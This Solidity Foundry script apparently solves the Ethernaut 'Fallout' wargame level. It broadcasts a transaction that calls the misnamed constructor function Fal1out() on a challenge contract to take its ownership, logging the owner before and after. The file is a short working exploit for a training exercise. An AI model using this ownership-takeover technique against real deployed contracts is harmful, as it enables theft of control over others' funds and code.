// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Level2.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Level2 public falloutInstance = Level2(0xa602575857A6d9d6D447147A60c04F49425BedCa);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Old Owner: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("New Owner: ", falloutInstance.owner());

        vm.stopBroadcast();
    }
}